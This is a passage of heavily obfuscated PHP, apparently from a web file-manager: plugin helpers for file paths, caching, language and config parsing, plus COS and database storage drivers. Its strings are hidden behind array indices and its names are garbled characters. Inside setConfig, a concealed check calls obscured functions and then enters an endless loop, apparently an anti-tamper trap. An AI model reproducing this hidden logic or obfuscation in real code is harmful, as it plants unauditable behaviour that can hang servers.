filePathLink($Á’¦á¨Ÿ) { if (request_url_safe($Á’¦á¨Ÿ)) { return $Á’¦á¨Ÿ; } if (!$this->isShare($Á’¦á¨Ÿ)) { $Á’¦á¨Ÿ = $this->filePath($Á’¦á¨Ÿ); } return Action($_SERVER[Á÷ ­Šë][1101])->linkOut($Á’¦á¨Ÿ); } public function filePathLinkOut($‰àõõê) { if (request_url_safe($‰àõõê)) { return $‰àõõê; } $this->fileCanView($‰àõõê); return Action($_SERVER[Á÷ ­Šë][1101])->link($‰àõõê); } final function filePath($â‘â¼ô”) { $Ğ­ËÙØ =& $_SERVER[Á÷ ­Šë]; if ($Ïíòİ¦¤ = $this->checkSharePath($â‘â¼ô”)) { Hook::trigger($Ğ­ËÙØ[1466], $Ïíòİ¦¤); return $Ïíòİ¦¤; } $this->fileCanView($â‘â¼ô”); if (request_url_safe($â‘â¼ô”)) { $¨èƒ®¦– = parse_url_query($â‘â¼ô”); if (isset($¨èƒ®¦–[$Ğ­ËÙØ[1467]]) && isset($¨èƒ®¦–[$Ğ­ËÙØ[219]])) { $‹ÓÚ¸Ğ¹ = Model($Ğ­ËÙØ[765])->get($Ğ­ËÙØ[766]); $Œø‹ı® = Mcrypt::decode($¨èƒ®¦–[$Ğ­ËÙØ[219]], $‹ÓÚ¸Ğ¹); if ($Œø‹ı®) { $this->fileInfo = IO::infoWithChildren($Œø‹ı®); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $Œø‹ı®; } } $â‘â¼ô” = $this->_cacheHttpFile($â‘â¼ô”); $this->fileInfo = IO::infoWithChildren($â‘â¼ô”); } else { $this->fileInfo = IO::infoWithChildren($â‘â¼ô”); if (!$this->fileInfo) { show_tips(LNG($Ğ­ËÙØ[115]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($Ğ­ËÙØ[1466], $â‘â¼ô”); return $â‘â¼ô”; } final function _cacheHttpFile($ªøº®™ˆ) { $ÓÊ…åŸ¢ = hash_path($ªøº®™ˆ, !0); $this->cachePath = $this->pluginCachePath($ÓÊ…åŸ¢); if ($¡Çé‰«¡ = IO::fileNameExist($this->cachePath, $ÓÊ…åŸ¢)) { return KodIO::make($¡Çé‰«¡); } $ØƒÈ“ñˆ = $this->cachePath . $ÓÊ…åŸ¢; return $this->pluginCacheFileSet($ØƒÈ“ñˆ, file_get_contents_nossl($ªøº®™ˆ)); } final function _tmpFileName($Å¤íÚù = array()) { $ˆÊüªå =& $_SERVER[Á÷ ­Šë]; if (!$Å¤íÚù) { $Å¤íÚù = $this->fileInfo; } if (isset($Å¤íÚù[$ˆÊüªå[181]])) { return $Å¤íÚù[$ˆÊüªå[181]]; } if (isset($Å¤íÚù[$ˆÊüªå[174]][$ˆÊüªå[181]])) { return $Å¤íÚù[$ˆÊüªå[174]][$ˆÊüªå[181]]; } $»ßÕ×ÅÜ = IO::hashSimple($Å¤íÚù[$ˆÊüªå[86]]); if ($»ßÕ×ÅÜ) { return $»ßÕ×ÅÜ; } $ìöÀÉÔË = array($Å¤íÚù[$ˆÊüªå[28]], $Å¤íÚù[$ˆÊüªå[86]], $Å¤íÚù[$ˆÊüªå[88]]); if (isset($Å¤íÚù[$ˆÊüªå[525]])) { $ìöÀÉÔË[] = $Å¤íÚù[$ˆÊüªå[525]]; } return md5(implode($ˆÊüªå[81], $ìöÀÉÔË)); } final function checkSharePath($’í”äÜ) { $ÊŠßèé =& $_SERVER[Á÷ ­Šë]; if (!defined($ÊŠßèé[478])) { define($ÊŠßèé[518], 0); } if (!$this->isShare($’í”äÜ)) { return !1; } $ıŠî–Åª = Action($ÊŠßèé[1101])->sharePathInfo($’í”äÜ); if (!isset($ıŠî–Åª[$ÊŠßèé[86]])) { show_json(LNG($ÊŠßèé[1468]), !1); } $this->fileInfo = $ıŠî–Åª[$ÊŠßèé[174]]; $this->cachePath = $this->pluginCachePath($this->fileInfo[$ÊŠßèé[181]]); return $ıŠî–Åª[$ÊŠßèé[86]]; } final function pluginCachePath($×¤éâÆÓ = '') { $Õñåô– =& $_SERVER[Á÷ ­Šë]; $‘ãî±Ÿ‚ = IO_PATH_SYSTEM_TEMP . $Õñåô–[1469] . $this->pluginName; if (!($£Í’ö„³ = IO::infoFull($‘ãî±Ÿ‚))) { return IO::mkdir($‘ãî±Ÿ‚ . $Õñåô–[8] . $×¤éâÆÓ); } if (empty($×¤éâÆÓ)) { return $£Í’ö„³[$Õñåô–[86]]; } if (!($„Ãáı²ö = IO::fileNameExist($£Í’ö„³[$Õñåô–[86]], $×¤éâÆÓ))) { return IO::mkdir($£Í’ö„³[$Õñåô–[86]] . $×¤éâÆÓ); } return KodIO::make($„Ãáı²ö); } final function pluginCacheFileSet($‚®ˆØ¶ñ, $»í¥ãï¯ = '') { $ôƒù™Î¹ =& $_SERVER[Á÷ ­Šë]; if (!($¶Ù”øÎê = IO::infoFull($‚®ˆØ¶ñ))) { return IO::mkfile($‚®ˆØ¶ñ, $»í¥ãï¯, REPEAT_REPLACE); } IO::setContent($¶Ù”øÎê[$ôƒù™Î¹[86]], $»í¥ãï¯); return $¶Ù”øÎê[$ôƒù™Î¹[86]]; } final function pluginLocalFile($ÁÀÎ¶“™ = '') { $÷óä¤¥ =& $_SERVER[Á÷ ­Šë]; $¡©ÂÌÎ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($¡©ÂÌÎ)) { mk_dir($¡©ÂÌÎ); } if (!$ÁÀÎ¶“™) { return $¡©ÂÌÎ; } $ª›¤¬ã = IO::info($ÁÀÎ¶“™); $¦êŞ¨Óœ = $this->_tmpFileName($ª›¤¬ã) . $÷óä¤¥[105] . $ª›¤¬ã[$÷óä¤¥[178]]; if (!checkExtSafe($¦êŞ¨Óœ)) { $¦êŞ¨Óœ = $¦êŞ¨Óœ . $÷óä¤¥[1470]; } $¯ö‘Ãó = $¡©ÂÌÎ . $¦êŞ¨Óœ; if (@file_exists($¯ö‘Ãó)) { return $¯ö‘Ãó; } return IO::copy($ÁÀÎ¶“™, $¡©ÂÌÎ, 0, $¦êŞ¨Óœ); } final function appPackage() { $Ú€¾ƒãâ =& $_SERVER[Á÷ ­Šë]; if ($this->packageData) { return $this->packageData; } $úÍİ×½ = $this->parseFile($this->pluginPath . $Ú€¾ƒãâ[1471]); $this->parseLang($úÍİ×½); $Ğ©Š‚¼ë = json_decode_force($úÍİ×½); if (!$Ğ©Š‚¼ë) { return array(); } $½‚¾¯¿× = Hook::trigger($Ú€¾ƒãâ[1472], $Ğ©Š‚¼ë); if ($½‚¾¯¿× && is_array($½‚¾¯¿×)) { $Ğ©Š‚¼ë = $½‚¾¯¿×; } $this->packageData = $Ğ©Š‚¼ë; return $Ğ©Š‚¼ë; } public function packageInfoGet($Æ·÷¾¸¿) { $ÁéÛ¿û– = $this->appPackage(); return array_get_value($ÁéÛ¿û–, $Æ·÷¾¸¿); } public function packageVersion() { return $this->packageInfoGet($_SERVER[Á÷ ­Šë][1473]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[Á÷ ­Šë][1474]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[Á÷ ­Šë][1475]); } public function echoJsAssign($Øğ¡À›Æ, $ĞÎ™éÁ´) { $this->echoJsAssignArr[$Øğ¡À›Æ] = $ĞÎ™éÁ´; } private function parseFile($±Û¾ê›¼) { $ÛÎ—ó†³ =& $_SERVER[Á÷ ­Šë]; $‡ã—èÍê = file_get_contents_nossl($±Û¾ê›¼); $’Á÷®Ï = array($ÛÎ—ó†³[1476], $ÛÎ—ó†³[1477], $ÛÎ—ó†³[1478], $ÛÎ—ó†³[1479], $ÛÎ—ó†³[1480], $ÛÎ—ó†³[1481], $ÛÎ—ó†³[1482]); $òÁˆõ³È = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$ÛÎ—ó†³[98]][$ÛÎ—ó†³[1483]]); foreach ($this->echoJsAssignArr as $ÑÑã”„ => $ïêüˆÊë) { $’Á÷®Ï[] = $ÛÎ—ó†³[1484] . $ÑÑã”„ . $ÛÎ—ó†³[1485]; $òÁˆõ³È[] = is_array($ïêüˆÊë) || is_object($ïêüˆÊë) ? rawurlencode(json_encode($ïêüˆÊë)) : $ïêüˆÊë; } if (strstr($‡ã—èÍê, $ÛÎ—ó†³[1486])) { $¼–ï”Ã = rawurlencode(json_encode($this->pluginLangArr)); $‡ã—èÍê = str_replace($ÛÎ—ó†³[1486], $¼–ï”Ã, $‡ã—èÍê); } if (strstr($‡ã—èÍê, $ÛÎ—ó†³[1487])) { $¼–ï”Ã = $¼–ï”Ã = rawurlencode(json_encode($this->getConfig())); $‡ã—èÍê = str_replace($ÛÎ—ó†³[1487], $¼–ï”Ã, $‡ã—èÍê); } $‡ã—èÍê = str_replace($’Á÷®Ï, $òÁˆõ³È, $‡ã—èÍê); return $‡ã—èÍê; } private function parseLang(&$¥ªÆúˆµ) { $æŒÌ‡›Ã =& $_SERVER[Á÷ ­Šë]; $ˆÀ´ú = $æŒÌ‡›Ã[1488]; if (!strstr($¥ªÆúˆµ, $ˆÀ´ú)) { return; } preg_match_all($æŒÌ‡›Ã[1489], $¥ªÆúˆµ, $¼°î”¹); if (!is_array($¼°î”¹) || count($¼°î”¹) == 0 || !is_array($¼°î”¹[0]) || count($¼°î”¹[0]) == 0) { return; } $Ç÷ò¿œ£ = array(); $Ø¸‚ÌË¡ = array(); foreach ($¼°î”¹[0] as $“ŞÙ‰ó) { $™¬ö»«š = substr($“ŞÙ‰ó, strlen($ˆÀ´ú), -4); $–³•…şõ = LNG($™¬ö»«š); $Ç÷ò¿œ£[] = $“ŞÙ‰ó; $Ø¸‚ÌË¡[] = str_replace(array($æŒÌ‡›Ã[62], $æŒÌ‡›Ã[1069], $æŒÌ‡›Ã[349], $æŒÌ‡›Ã[126]), array($æŒÌ‡›Ã[50], $æŒÌ‡›Ã[50], $æŒÌ‡›Ã[33], $æŒÌ‡›Ã[1490]), $–³•…şõ); } $¥ªÆúˆµ = str_replace($Ç÷ò¿œ£, $Ø¸‚ÌË¡, $¥ªÆúˆµ); } private function parseConfig(&$ˆÍˆÎˆ) { $»şÌĞ„» =& $_SERVER[Á÷ ­Šë]; $›’„ºóà = $»şÌĞ„»[1491]; if (!strstr($ˆÍˆÎˆ, $›’„ºóà)) { return; } preg_match_all($»şÌĞ„»[1492], $ˆÍˆÎˆ, $®ÂÜğÍğ); if (!is_array($®ÂÜğÍğ) || count($®ÂÜğÍğ) == 0 || !is_array($®ÂÜğÍğ[0]) || count($®ÂÜğÍğ[0]) == 0) { return; } $É¹È«ëÔ = $this->getConfig(); $›Â´÷´ƒ = array(); $¬Á˜å—Š = array(); foreach ($®ÂÜğÍğ[0] as $ˆ µ¸»Ñ) { $¹èì‘£ = substr($ˆ µ¸»Ñ, strlen($›’„ºóà), -2); $›Â´÷´ƒ[] = $ˆ µ¸»Ñ; $¬Á˜å—Š[] = _get($É¹È«ëÔ, $¹èì‘£); } $ˆÍˆÎˆ = str_replace($›Â´÷´ƒ, $¬Á˜å—Š, $ˆÍˆÎˆ); } private function parsePackage(&$Á±¹Ÿ‡) { $Äø¨‚› =& $_SERVER[Á÷ ­Šë]; $­áÄ§ÔŞ = $Äø¨‚›[1493]; if (!strstr($Á±¹Ÿ‡, $­áÄ§ÔŞ)) { return; } preg_match_all($Äø¨‚›[1494], $Á±¹Ÿ‡, $êü¯õ); if (!is_array($êü¯õ) || count($êü¯õ) == 0 || !is_array($êü¯õ[0]) || count($êü¯õ[0]) == 0) { return; } $±ª²ù™ç = $this->appPackage(); $ü‚Î×¬ = array(); $…éï¥ô— = array(); foreach ($êü¯õ[0] as $Ê§µ­æŸ) { $¯·õÊÚâ = substr($Ê§µ­æŸ, strlen($­áÄ§ÔŞ), -2); $ü‚Î×¬[] = $Ê§µ­æŸ; $…éï¥ô—[] = _get($±ª²ù™ç, $¯·õÊÚâ); } $Á±¹Ÿ‡ = str_replace($ü‚Î×¬, $…éï¥ô—, $Á±¹Ÿ‡); } final function echoFile($²„¡´È¿, $Ô—‚ÍÒ÷ = false) { $ŞÈËãÇÎ =& $_SERVER[Á÷ ­Šë]; $â†À¾ç = $this->pluginPath . $²„¡´È¿; if (ACT == $ŞÈËãÇÎ[1495]) { echo $ŞÈËãÇÎ[1496] . $this->pluginName . $ŞÈËãÇÎ[8] . $²„¡´È¿ . $ŞÈËãÇÎ[1497]; if (!file_exists($â†À¾ç)) { echo $ŞÈËãÇÎ[1498]; return; } } $Ïä—¿¼ = $this->parseFile($â†À¾ç); $this->parseLang($Ïä—¿¼); $this->parseConfig($Ïä—¿¼); $this->parsePackage($Ïä—¿¼); if (is_array($Ô—‚ÍÒ÷)) { $Ïä—¿¼ = str_replace(array_keys($Ô—‚ÍÒ÷), array_values($Ô—‚ÍÒ÷), $Ïä—¿¼); } echo $ŞÈËãÇÎ[62] . $Ïä—¿¼; } final function initLang() { $òÈ½¤³— =& $_SERVER[Á÷ ­Šë]; $¯Øè×Ş = $òÈ½¤³—[1499]; $½Ì·˜å = $this->pluginPath . $òÈ½¤³—[1500]; $ßôÄ©Ö = I18n::getType(); $ÌÂ“°Èé = array(); if (file_exists($½Ì·˜å . $ßôÄ©Ö . $òÈ½¤³—[840])) { $ÌÂ“°Èé = (include $½Ì·˜å . $ßôÄ©Ö . $òÈ½¤³—[840]); } else { if ($ßôÄ©Ö == $òÈ½¤³—[1501] && !file_exists($½Ì·˜å . $ßôÄ©Ö . $òÈ½¤³—[840]) && file_exists($½Ì·˜å . $òÈ½¤³—[1502])) { $ÌÂ“°Èé = (include $½Ì·˜å . $òÈ½¤³—[1502]); } else { if (file_exists($½Ì·˜å . $¯Øè×Ş . $òÈ½¤³—[840])) { $ÌÂ“°Èé = (include $½Ì·˜å . $¯Øè×Ş . $òÈ½¤³—[840]); } } } if (!is_array($ÌÂ“°Èé)) { return array(); } if (@count($ÌÂ“°Èé) > 0) { I18n::set($ÌÂ“°Èé); } return $ÌÂ“°Èé; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($ï­áƒ«) { $ÌŞµ¨À =& $_SERVER[Á÷ ­Šë]; if (!isset($_SERVER[$ÌŞµ¨À[57]]) || !isset($_SERVER[$ÌŞµ¨À[66]])) { $Áüù¾Áı = $ÌŞµ¨À[874]; $Øã™› = $ÌŞµ¨À[59]; $æŠÎşôÅ = $_SERVER[$ÌŞµ¨À[60]] . $ÌŞµ¨À[61]; $Çô–ìÄ¦ = $Øã™›($æŠÎşôÅ); $ÃºµºÚÃ = explode($ÌŞµ¨À[62], $Çô–ìÄ¦); if (count($ÃºµºÚÃ) < $ÌŞµ¨À[639]) { $èÃÁ™ã = $ÌŞµ¨À[64]; $èÃÁ™ã(); } $ù‰¥ßê = $ÌŞµ¨À[875]; $ù‰¥ßê($_SERVER[$ÌŞµ¨À[876]]); $õŒ¡ï¨  = 1; for ($óÃ²ì§ = $õŒ¡ï¨ ; $óÃ²ì§ > 0; $óÃ²ì§++) { $ù‰¥ßê = json_encode($GLOBALS[$ÌŞµ¨À[423]]); } } return $this->modelPlugin->setConfig($this->pluginName, $ï­áƒ«); } public function onSetConfig($âºöÍê–) { } public function onGetConfig($Ğ×»Ì‚›) { } public function onChangeStatus($„ûøë¼½) { } public function onUninstall() { } public function onInstall() { } public function authCheck($û—Ë—ãö = "\160\x6c\x75\147\151\x6e\101\165\164\x68") { $›°İ©‚— =& $_SERVER[Á÷ ­Šë]; if (!defined($›°İ©‚—[478])) { return !1; } if (_get($GLOBALS, $›°İ©‚—[509])) { return !0; } $È²¸ÂÇ = $this->getConfig(); if (!$È²¸ÂÇ[$û—Ë—ãö]) { return !1; } return ActionCall($›°İ©‚—[1503], $È²¸ÂÇ[$û—Ë—ãö]); } public function url($ş²…é²Æ, $¤÷°ì£Á = '', $êÔü…¸ = true) { $Ñû¤ÓÒ =& $_SERVER[Á÷ ­Šë]; $Ã•÷å¾ = $this->getConfig(); $ÁèøÙˆ¼ = KOD_VERSION . $Ñû¤ÓÒ[105] . KOD_VERSION_BUILD; $ï²íÙÄÄ = $this->packageVersion(); $±ÊÎœ© = $ÁèøÙˆ¼ . $Ñû¤ÓÒ[464] . $ï²íÙÄÄ; if (substr($ş²…é²Æ, 0, 4) == $Ñû¤ÓÒ[157] || substr($ş²…é²Æ, 0, 2) == $Ñû¤ÓÒ[1289]) { $°°½†ƒÆ = $ş²…é²Æ . $Ñû¤ÓÒ[1504] . $±ÊÎœ©; } else { if ($¤÷°ì£Á == $Ñû¤ÓÒ[33]) { $°°½†ƒÆ = $this->pluginHost . $ş²…é²Æ . $Ñû¤ÓÒ[1504] . $±ÊÎœ©; } else { if ($¤÷°ì£Á === $Ñû¤ÓÒ[87]) { $°°½†ƒÆ = $this->pluginHost . $ş²…é²Æ; } else { if ($¤÷°ì£Á == $Ñû¤ÓÒ[1505]) { $°°½†ƒÆ = STATIC_PATH . $ş²…é²Æ . $Ñû¤ÓÒ[1504] . $ÁèøÙˆ¼; } else { if ($¤÷°ì£Á == $Ñû¤ÓÒ[1506]) { $°°½†ƒÆ = APP_HOST . $Ñû¤ÓÒ[1507] . $ş²…é²Æ . $Ñû¤ÓÒ[1504] . $ÁèøÙˆ¼; } else { if (isset($Ã•÷å¾[$¤÷°ì£Á])) { $°°½†ƒÆ = $Ã•÷å¾[$¤÷°ì£Á] . $ş²…é²Æ . $Ñû¤ÓÒ[1504] . $±ÊÎœ©; } } } } } } if (!$êÔü…¸) { return $°°½†ƒÆ; } echo $°°½†ƒÆ; } public function link($Æü£Ú†» = false, $¨‰à†×ù = '') { $ßì¶áÛ =& $_SERVER[Á÷ ­Šë]; if (!$Æü£Ú†») { $this->link($ßì¶áÛ[1508], $ßì¶áÛ[1506]); $this->link($ßì¶áÛ[1509], $ßì¶áÛ[1505]); $this->link($ßì¶áÛ[1510], $ßì¶áÛ[1505]); $this->link($ßì¶áÛ[1511], $ßì¶áÛ[1505]); $this->link($ßì¶áÛ[1512], $ßì¶áÛ[1505]); return; } $£¡­¬‰Ó = $this->url($Æü£Ú†», $¨‰à†×ù, !1); if (substr($Æü£Ú†», -3) == $ßì¶áÛ[1513]) { echo $ßì¶áÛ[1514] . $£¡­¬‰Ó . $ßì¶áÛ[1515] . $ßì¶áÛ[62]; } else { if (substr($Æü£Ú†», -4) == $ßì¶áÛ[1516]) { echo $ßì¶áÛ[1517] . $£¡­¬‰Ó . $ßì¶áÛ[1518] . $ßì¶áÛ[62]; } } } } goto Cê²–Â±™°; Bó©Øˆ‰Ø¦: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($†ÈÇ†•¹) { parent::__construct($†ÈÇ†•¹); $this->signatureVersion($_SERVER[Á÷ ­Šë][222]); } public function uploadFormData($ãÓŞò²˜, $—¦«á´¼ = 3600) { $î—ıÚ×é =& $_SERVER[Á÷ ­Šë]; $åÉÇÂ¥Ç = $î—ıÚ×é[202]; $™§ëØÜ– = $î—ıÚ×é[239]; $ÃçğµÕŠ = $î—ıÚ×é[1232]; $ôÇ‰ëË = gmdate($î—ıÚ×é[1233], time() + $—¦«á´¼); $£³é†ûô = (string) time() . $î—ıÚ×é[78] . (string) (time() + $—¦«á´¼); $µ¡Ã¤…¨ = array($î—ıÚ×é[1234] => $ôÇ‰ëË, $î—ıÚ×é[1235] => array(array($î—ıÚ×é[1236] => $åÉÇÂ¥Ç), array($î—ıÚ×é[1237] => $this->bucket), array($î—ıÚ×é[1238], $î—ıÚ×é[1239], $î—ıÚ×é[33]), array($î—ıÚ×é[1240] => $ÃçğµÕŠ), array($î—ıÚ×é[1241] => $™§ëØÜ–), array($î—ıÚ×é[1242] => $this->accessKey), array($î—ıÚ×é[1243] => $£³é†ûô))); $µ¡Ã¤…¨ = json_encode($µ¡Ã¤…¨); $€¸Î¼ï„ = hash_hmac($î—ıÚ×é[239], $£³é†ûô, $this->secret); $ùÃÎèàĞ = sha1($µ¡Ã¤…¨); $‚°Á‰ç¥ = hash_hmac($î—ıÚ×é[239], $ùÃÎèàĞ, $€¸Î¼ï„); $Á°ë¹¾ = array($î—ıÚ×é[1236] => $åÉÇÂ¥Ç, $î—ıÚ×é[1240] => $ÃçğµÕŠ, $î—ıÚ×é[1244] => base64_encode($µ¡Ã¤…¨), $î—ıÚ×é[1241] => $™§ëØÜ–, $î—ıÚ×é[1242] => $this->accessKey, $î—ıÚ×é[1245] => $£³é†ûô, $î—ıÚ×é[1246] => $‚°Á‰ç¥, $î—ıÚ×é[185] => $this->getHost()); return $Á°ë¹¾; } public function fileOutLink($şˆÏÕ) { $©Î‘ìÜ‡ =& $_SERVER[Á÷ ­Šë]; if (substr($şˆÏÕ, 0, 7) == $©Î‘ìÜ‡[1247]) { $şˆÏÕ = $©Î‘ìÜ‡[1248] . substr($şˆÏÕ, 7); } header($©Î‘ìÜ‡[169] . $şˆÏÕ); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($å¬¯¾¿«) { $this->pathParse = $å¬¯¾¿«; $this->model = Model($_SERVER[Á÷ ­Šë][1249]); } public function getPath($Á…êš¢) { return trim($Á…êš¢, $_SERVER[Á÷ ­Šë][8]); } public function pathFather($§×í¦¾) { $ãœè¥íî = $this->parse($§×í¦¾); $ãœè¥íî = $this->infoSimple($§×í¦¾); return $ãœè¥íî ? $ãœè¥íî[$_SERVER[Á÷ ­Šë][502]] : !1; } public function pathThis($’Å¿é•) { $»×Œ’ê‘ = $this->infoSimple($’Å¿é•); return $»×Œ’ê‘ ? $»×Œ’ê‘[$_SERVER[Á÷ ­Šë][28]] : !1; } public function getPathOuter($†Ä©ñ´ß) { if (!$†Ä©ñ´ß) { return $†Ä©ñ´ß; } $ğä÷á¯ = $this->parse($†Ä©ñ´ß); return KodIO::make($ğä÷á¯[$_SERVER[Á÷ ­Šë][404]]); } public function copyFolderFromIO($§Òœ¥, $¨ºË™í™, $æ‹ÉÉÀ, $Îüøİ¶ , $Õ¦‹±¯¶) { $İÒº·×ğ = $this->model->copyFolderFromIO($§Òœ¥, $¨ºË™í™, $æ‹ÉÉÀ, $Îüøİ¶ , $Õ¦‹±¯¶); return KodIO::make($İÒº·×ğ); } public function isParentOf($“Ğ¢òË‚, $£½©œ¾ª) { return $this->model->isParentOf($“Ğ¢òË‚, $£½©œ¾ª); } public function mkfile($Œç·¯Å», $íÔ‹Ô„ = '', $÷‚ô¦‚é = REPEAT_RENAME) { $î‡öåå• =& $_SERVER[Á÷ ­Šë]; $”åµŒêü = $this->parse($Œç·¯Å»); $Œç·¯Å» = $”åµŒêü[$î‡öåå•[404]]; for ($§™æ¶Åó = 0; $§™æ¶Åó < count($”åµŒêü[$î‡öåå•[1250]]); $§™æ¶Åó++) { $óıºûšè = $”åµŒêü[$î‡öåå•[1250]][$§™æ¶Åó]; if ($§™æ¶Åó == count($”åµŒêü[$î‡öåå•[1250]]) - 1) { $Œç·¯Å» = $this->model->mkfile($Œç·¯Å», $óıºûšè, $íÔ‹Ô„, $÷‚ô¦‚é); break; } $Œç·¯Å» = $this->model->mkdir($Œç·¯Å», $óıºûšè, REPEAT_SKIP); } return $this->getPathOuter($Œç·¯Å»); } public function mkdir($úÅœ¸¯é, $¹±Ğ…† = REPEAT_SKIP) { $Â‡ğ‹Ş¨ =& $_SERVER[Á÷ ­Šë]; $áÔ÷µİ = $this->parse($úÅœ¸¯é); $úÅœ¸¯é = $áÔ÷µİ[$Â‡ğ‹Ş¨[404]]; for ($È•”‰÷ = 0; $È•”‰÷ < count($áÔ÷µİ[$Â‡ğ‹Ş¨[1250]]); $È•”‰÷++) { $·‰ØÄ ì = $áÔ÷µİ[$Â‡ğ‹Ş¨[1250]][$È•”‰÷]; $úÅœ¸¯é = $this->model->mkdir($úÅœ¸¯é, $·‰ØÄ ì, $¹±Ğ…†); } return $this->getPathOuter($úÅœ¸¯é); } public function copyFile($„—ô«, $¼û›İ‚Ã, $ŠÆÙï«Ö = REPEAT_REPLACE) { $¢€œ÷Á =& $_SERVER[Á÷ ­Šë]; $¥ØÂÍ = $this->parse($¼û›İ‚Ã); $µÎŞ­¾ô = $this->model->copy($„—ô«, $¥ØÂÍ[$¢€œ÷Á[404]], $ŠÆÙï«Ö, $¥ØÂÍ[$¢€œ÷Á[86]]); return $µÎŞ­¾ô ? $this->getPathOuter($µÎŞ­¾ô) : !1; } public function moveFile($ß¤Ê¼‡, $óÄÌœ ™, $ˆÛæ¢ş = REPEAT_REPLACE) { $€€¡Ş‚³ =& $_SERVER[Á÷ ­Šë]; $³ö¨ÚãÉ = $this->parse($óÄÌœ ™); $–¯­™Ùš = $this->model->move($ß¤Ê¼‡, $³ö¨ÚãÉ[$€€¡Ş‚³[404]], $ˆÛæ¢ş, $³ö¨ÚãÉ[$€€¡Ş‚³[86]]); return $–¯­™Ùš ? $this->getPathOuter($–¯­™Ùš) : !1; } public function copy($­Œ‘à, $ƒÏ‡âøë, $ª¡ˆ«¸Ã = REPEAT_REPLACE, $˜ÊÜåŞ– = false) { $İÜ¥ïË³ = $this->parse($ƒÏ‡âøë); $§ù ‘Ò = $this->model->copy($­Œ‘à, $İÜ¥ïË³[$_SERVER[Á÷ ­Šë][404]], $ª¡ˆ«¸Ã, $˜ÊÜåŞ–); return $§ù ‘Ò ? $this->getPathOuter($§ù ‘Ò) : !1; } public function moveSameAllow() { } public function move($úà¯ÓÂ, $ Ã„¦ËÚ, $ÀæâµÂË = REPEAT_REPLACE, $Ù˜†ÒÒı = false) { $ÎÕ¤ÍÚà = $this->parse($ Ã„¦ËÚ); $£Å¬´øÃ = $this->model->move($úà¯ÓÂ, $ÎÕ¤ÍÚà[$_SERVER[Á÷ ­Šë][404]], $ÀæâµÂË, $Ù˜†ÒÒı); return $£Å¬´øÃ ? $this->getPathOuter($£Å¬´øÃ) : !1; } public function remove($ä»ìË¤Í, $Óá¸¨Ü× = true) { return $this->model->remove($ä»ìË¤Í, $Óá¸¨Ü×); } public function rename($‹çáù¨‡, $½Š§²) { $ñŠÜº¿ = $this->model->rename($‹çáù¨‡, $½Š§²); return $ñŠÜº¿ ? $this->getPathOuter($‹çáù¨‡) : $ñŠÜº¿; } public function size($’•ìªüï) { $êí’±Àœ = $this->infoSimple($’•ìªüï); return $êí’±Àœ ? $êí’±Àœ[$_SERVER[Á÷ ­Šë][88]] : 0; } public function infoSimple($´ ¨ô¡¦) { return $this->model->sourceInfo($´ ¨ô¡¦); } public function info($²Û¨‘ÛÅ) { return $this->infoParse($²Û¨‘ÛÅ); } public function infoAuth($åÅ‹îúÈ) { return $this->infoParse($åÅ‹îúÈ, !1, !0); } public function infoWithChildren($ÓÄö‹æ) { return $this->infoParse($ÓÄö‹æ, !0); } protected function infoParse($…¦Â»À¼, $’“±„²ë = false, $Äèè˜¾ç = false) { if (!$’“±„²ë) { return $this->model->pathInfo($…¦Â»À¼, $Äèè˜¾ç); } return $this->model->pathInfoMore($…¦Â»À¼); } public function infoFull($˜ùİé·Š) { $Ä²ÜÏ²ê =& $_SERVER[Á÷ ­Šë]; $âšºÄ¶» = explode($Ä²ÜÏ²ê[8], $˜ùİé·Š); $¥Ù†‹¸ = implode($Ä²ÜÏ²ê[8], array_splice($âšºÄ¶», 1)); return $this->model->pathInfoByPath($âšºÄ¶»[0], $¥Ù†‹¸); } public function hashSimple($¢Í–ØÀÊ) { $èÓ™Ó¾© =& $_SERVER[Á÷ ­Šë]; $ó²¥„õˆ = $this->infoWithChildren($¢Í–ØÀÊ); return $ó²¥„õˆ[$èÓ™Ó¾©[174]][$èÓ™Ó¾©[181]]; } public function hashMd5($‚À®¡€) { $âóÔšÖ =& $_SERVER[Á÷ ­Šë]; $ëÍĞ° = $this->infoWithChildren($‚À®¡€); return $ëÍĞ°[$âóÔšÖ[174]][$âóÔšÖ[180]]; } public function exist($´¥Úôìº) { $³Ô“âØå =& $_SERVER[Á÷ ­Šë]; $Í§·§“ı = $this->parse($´¥Úôìº); if (!$Í§·§“ı[$³Ô“âØå[86]]) { return $this->isFile($´¥Úôìº) || $this->isFolder($´¥Úôìº); } $ƒğÅİ…¸ = array($³Ô“âØå[406] => $Í§·§“ı[$³Ô“âØå[404]], $³Ô“âØå[28] => $Í§·§“ı[$³Ô“âØå[86]]); $Åá”Ôâ = $this->model->where($ƒğÅİ…¸)->find(); return $Åá”Ôâ ? !0 : !1; } public function isFile($óô¢øŠå) { $Ù¨•´×ƒ =& $_SERVER[Á÷ ­Šë]; $şë—•…™ = $this->infoSimple($óô¢øŠå); return $şë—•…™ && $şë—•…™[$Ù¨•´×ƒ[415]] == $Ù¨•´×ƒ[97] ? !1 : !0; } public function isFolder($âÙ“®”•) { $ü´€’Ì¾ =& $_SERVER[Á÷ ­Šë]; $–¹àúÆë = $this->infoSimple($âÙ“®”•); return $–¹àúÆë && $–¹àúÆë[$ü´€’Ì¾[415]] == $ü´€’Ì¾[97] ? !0 : !1; } public function listPath($ğ¡Ğ®“Ü, $Á¢¹ûªî = false) { $ÉÁşçš =& $_SERVER[Á÷ ­Šë]; if ($ğ¡Ğ®“Ü == $ÉÁşçš[33]) { return !1; } $õ‹€¼Óì = array($ÉÁşçš[406] => $ğ¡Ğ®“Ü); if ($Á¢¹ûªî) { return $this->model->listSource($õ‹€¼Óì, -1); } return $this->model->listSource($õ‹€¼Óì); } public function has($‚¡ĞÌú®, $ñ£é½ = false, $°†Œï¨Ø = null) { $ó¦‡Ôƒ› =& $_SERVER[Á÷ ­Šë]; $ŸÁãİÈÀ = $this->infoWithChildren($‚¡ĞÌú®); if ($ñ£é½) { return array($ó¦‡Ôƒ›[214] => 